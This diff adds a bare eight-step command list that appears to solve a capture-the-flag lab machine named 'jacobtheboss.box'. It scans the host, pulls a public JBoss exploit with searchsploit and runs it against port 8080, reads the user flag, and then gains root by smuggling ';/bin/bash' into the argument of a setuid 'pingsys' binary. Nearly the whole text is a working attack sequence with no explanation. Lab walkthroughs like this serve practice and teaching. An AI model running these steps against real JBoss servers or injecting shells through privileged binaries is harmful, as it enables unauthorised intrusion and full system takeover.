@@ -1,0 +1,8 @@
+1 - echo "10.10.252.157 jacobtheboss.box" | tee -a /etc/hosts
+2 - nmap -A 10.10.252.157
+3 - searchsploit "jboss"
+4 - searchsploit -m 36575
+5 - python2.7 36575.py jacobtheboss.box:8080
+6 - cat /home/jacob/user.txt
+7 - /usr/bin/pingsys "127.0.0.1;/bin/bash"
+8 - cat /root/root.txt
